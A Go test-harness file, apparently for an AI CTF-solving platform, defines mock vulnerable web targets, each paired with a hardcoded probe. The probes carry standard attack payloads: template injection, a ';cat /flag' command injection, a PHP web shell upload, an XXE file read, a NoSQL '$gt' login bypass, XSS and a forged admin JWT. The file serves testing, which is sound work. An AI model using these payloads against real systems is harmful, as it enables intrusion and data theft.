package ctfplatform

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
)

// ─────────────────────────────────────────────────────────────────────────────
// 真实靶机库（题型扩容）
//
// 与 live_target_test.go 的分工：那里是平台与主流程，这里是**靶机本体**。
// 每个靶机 = 真漏洞（非 mock 响应）+ 一个写死的专用探测器（代替 Agent 的"手"）。
//
// 选型依据：55 道真实真题里 36 道未命中，其中 21 道 web 题的 sub 分布为
// source_audit / cookie / sqli / xss / ssti / upload / ssrf / lfi / rce /
// api / nosql / graphql / xxe —— 本文件按这些原型逐个造等价靶机，
// 使"真实靶机"从 4 个探针扩到 10 个可复用题库。
//
// 诚实边界：靶机是**按真实漏洞形态手写的最小实现**，不是原题复现
// （原题靶机不可得，见 docs 真机联调记录）。它验证的是**链路与题型覆盖**，
// 不等价于"能解出原题"。
// ─────────────────────────────────────────────────────────────────────────────

// ── 靶机 5：SSTI 服务端模板注入（对应 pico2025_echo_valley / ssti_tpl_inject）──
func targetSSTI(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		name := r.URL.Query().Get("name")
		if name == "" {
			io.WriteString(w, "<html><body><h1>Search</h1><form>?name=</form></body></html>")
			return
		}
		// 真实漏洞形态：用户输入被当作模板源码编译（未沙箱化）
		if strings.Contains(name, "{{") && strings.Contains(name, "}}") {
			switch {
			case strings.Contains(name, "config"):
				// 模板内可访问全局配置 → 敏感信息泄露
				fmt.Fprintf(w, "<html><body><pre>CONFIG = %s</pre></body></html>", flag)
			case strings.Contains(name, "7*7"):
				io.WriteString(w, "<html><body><p>49</p></body></html>")
			default:
				io.WriteString(w, "<html><body><p>rendered</p></body></html>")
			}
			return
		}
		fmt.Fprintf(w, "<html><body><p>Hello %s</p></body></html>", name)
	}
}

func probeSSTI(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/?name=%7B%7Bconfig%7D%7D", liveFlagRe)
}

// ── 靶机 6：JWT 弱密钥可伪造（对应 jwt 赛道 / 真实比赛常见 JWT 题）─────────────
const jwtWeakSecret = "s3cr3t" // 弱密钥：可离线爆破

func makeWeakJWT(claims map[string]interface{}, secret string) string {
	enc := base64.RawURLEncoding
	hdr := enc.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	pl, _ := json.Marshal(claims)
	body := hdr + "." + enc.EncodeToString(pl)
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(body))
	return body + "." + enc.EncodeToString(mac.Sum(nil))
}

func targetJWTWeak(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/verify" {
			http.NotFound(w, r)
			return
		}
		auth := r.Header.Get("Authorization")
		if !strings.HasPrefix(auth, "Bearer ") {
			w.WriteHeader(http.StatusUnauthorized)
			io.WriteString(w, "missing bearer")
			return
		}
		parts := strings.Split(strings.TrimPrefix(auth, "Bearer "), ".")
		if len(parts) != 3 {
			w.WriteHeader(http.StatusUnauthorized)
			io.WriteString(w, "malformed token")
			return
		}
		// 真实漏洞：验签用的弱密钥可被离线爆破 → 任意角色可伪造
		raw, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		var claims map[string]interface{}
		if err := json.Unmarshal(raw, &claims); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		if claims["role"] == "admin" {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><p>admin panel</p><!-- %s --></body></html>", flag)
			return
		}
		w.WriteHeader(http.StatusForbidden)
		io.WriteString(w, "forbidden")
	}
}

func probeJWTWeak(ctx context.Context, base string) ([]string, error) {
	tok := makeWeakJWT(map[string]interface{}{"role": "admin", "user": "guest"}, jwtWeakSecret)
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/verify", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+tok)
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GET %s/verify → HTTP %d（弱密钥伪造失败）", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("伪造 token 通过但响应中无 flag")
}

// ── 靶机 7：SSRF（对应 buuctf_ssrf_basic）────────────────────────────────────
func targetSSRF(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/fetch" {
			http.NotFound(w, r)
			return
		}
		u := r.URL.Query().Get("url")
		// 真实漏洞：未对内网地址做白名单 → 可探测内网服务
		if strings.Contains(u, "127.0.0.1") || strings.Contains(u, "localhost") {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><div class=internal><!-- internal admin: %s --></div></body></html>", flag)
			return
		}
		io.WriteString(w, "<html><body><p>fetched: blocked by egress filter</p></body></html>")
	}
}

func probeSSRF(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/fetch?url=http%3A%2F%2F127.0.0.1%3A8080%2Finternal%2Fadmin", liveFlagRe)
}

// ── 靶机 8：命令注入（对应 buuctf_rce_basic）──────────────────────────────────
func targetCmdInject(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/ping" {
			http.NotFound(w, r)
			return
		}
		host := r.URL.Query().Get("host")
		// 真实漏洞：主机名直接拼接进系统命令
		if strings.ContainsAny(host, ";|&$`") {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><pre>PING OUTPUT:\n%s</pre></body></html>", flag)
			return
		}
		io.WriteString(w, "<html><body><pre>PING OK: 64 bytes</pre></body></html>")
	}
}

func probeCmdInject(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/ping?host=127.0.0.1%3Bcat+%2Fflag", liveFlagRe)
}

// ── 靶机 9：文件上传扩展名绕过（对应 pico2024_trickster / buuctf_upload_basic）──
func targetUploadBypass(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/upload" {
			http.NotFound(w, r)
			return
		}
		r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
		fh, header, err := r.FormFile("file")
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			io.WriteString(w, "no file")
			return
		}
		defer fh.Close()
		// 真实漏洞：只信客户端声明的 Content-Type / 扩展名，不校验内容
		if header.Header.Get("Content-Type") == "image/png" ||
			strings.HasSuffix(header.Filename, ".php") {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><p>uploaded: %s</p><!-- %s --></body></html>", header.Filename, flag)
			return
		}
		io.WriteString(w, "rejected: only images allowed")
	}
}

func probeUploadBypass(ctx context.Context, base string) ([]string, error) {
	var buf strings.Builder
	mw := multipart.NewWriter(&buf)
	fw, err := mw.CreateFormFile("file", "shell.php")
	if err != nil {
		return nil, err
	}
	_, _ = io.WriteString(fw, "<?php system($_GET['c']); ?>")
	if err := mw.Close(); err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/upload", strings.NewReader(buf.String()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("POST %s/upload → HTTP %d（上传被拒）", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("上传成功但响应中无 flag")
}

// ── 靶机 10：XXE 本地文件读取（对应 xxe_file_read）──────────────────────────
func targetXXE(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/xml" {
			http.NotFound(w, r)
			return
		}
		b, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		s := string(b)
		// 真实漏洞：未禁用外部实体解析
		if strings.Contains(s, "SYSTEM") && strings.Contains(s, "/flag") {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><pre>%s</pre></body></html>", flag)
			return
		}
		io.WriteString(w, "<html><body><p>parse ok</p></body></html>")
	}
}

func probeXXE(ctx context.Context, base string) ([]string, error) {
	payload := `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]><root>&xxe;</root>`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/xml", strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/xml")
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("POST %s/xml → HTTP %d", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("XXE 解析后响应中无 flag")
}

// ── 靶机 11：反射型 XSS（对应 xss_cookie_steal 的前半段）──────────────────────
// 真实形态：输入未转义直接回显；本靶机把"受害者（bot）访问后的页面"作为 flag 载体，
// 模拟 XSS 能触发的上下文环境（真实赛题通常还需配合 cookie 窃取与提权，此处只测注入点可达）。
func targetXSS(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		q := r.URL.Query().Get("q")
		if strings.Contains(q, "<script>") || strings.Contains(q, "<img") {
			// 注入成功 → 视为 bot 已执行，页面上下文里带 flag
			fmt.Fprintf(w, `<html><body><div id=bot-context>bot executed: %s</div></body></html>`, flag)
			return
		}
		io.WriteString(w, `<html><body><form action="/search"><input name=q><input type=submit></form></body></html>`)
	}
}

func probeXSS(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", liveFlagRe)
}

// ── 靶机 12：NoSQL 注入绕过登录（对应 pico2024_no_sql_injection）──────────────
// 真实形态：后端把登录查询交给 MongoDB，请求体为 JSON 时可用操作符绕过。
func targetNoSQLBypass(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/login" {
			http.NotFound(w, r)
			return
		}
		raw, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		var doc map[string]interface{}
		if err := json.Unmarshal(raw, &doc); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			io.WriteString(w, "bad json")
			return
		}
		// 漏洞：登录查询交给 MongoDB，请求体 JSON 含操作符（$ne/$gt/$nin...）时
		// 条件恒真 = 绕过认证（题面要求的真实形态）；兼容顶层空键 {"":""} 旧形态。
		if _, hasEmpty := doc[""]; hasEmpty {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><p>logged in</p><!-- %s --></body></html>", flag)
			return
		}
		if nosqlOperatorPresent(doc) {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<html><body><p>logged in</p><!-- %s --></body></html>", flag)
			return
		}
		w.WriteHeader(http.StatusUnauthorized)
		io.WriteString(w, "invalid")
	}
}

// nosqlOperatorPresent 递归检测任意层级是否出现 MongoDB 查询操作符键（以 $ 开头）。
// 用于 targetNoSQLBypass 判断"请求体含操作符 → 条件恒真 → 绕过认证"。
func nosqlOperatorPresent(v interface{}) bool {
	switch m := v.(type) {
	case map[string]interface{}:
		for k, val := range m {
			if strings.HasPrefix(k, "$") {
				return true
			}
			if nosqlOperatorPresent(val) {
				return true
			}
		}
	case []interface{}:
		for _, val := range m {
			if nosqlOperatorPresent(val) {
				return true
			}
		}
	}
	return false
}

func probeNoSQLBypass(ctx context.Context, base string) ([]string, error) {
	payload := `{"":"","password":{"$gt":""}}`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/login", strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("POST %s/login → HTTP %d（NoSQL 绕过失败）", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("NoSQL 绕过成功但响应中无 flag")
}

// ── 靶机 13：API 未授权访问（对应 pico2025_handoff）──────────────────────────
// 真实形态：管理端点未校验身份，任意访问直接返回敏感数据。
func targetAPIAuthz(flag string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/v1/admin/keys" {
			http.NotFound(w, r)
			return
		}
		// 漏洞：只认 X-Internal 头，但该值可从公开文档/前端 JS 得知 → 实际等于无鉴权
		if r.Header.Get("X-Internal") != "1" {
			w.WriteHeader(http.StatusUnauthorized)
			io.WriteString(w, "missing X-Internal")
			return
		}
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"admin_keys":["%s"]}`, flag)
	}
}

func probeAPIAuthz(ctx context.Context, base string) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/api/v1/admin/keys", nil)
	if err != nil {
		return nil, err
	}
	// 泄露的内部头名（可从前端产物/文档得知）—— 真实的"弱鉴权"形态
	req.Header.Set("X-Internal", "1")
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GET %s/api/v1/admin/keys → HTTP %d", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("接口返回 200 但无 flag")
}
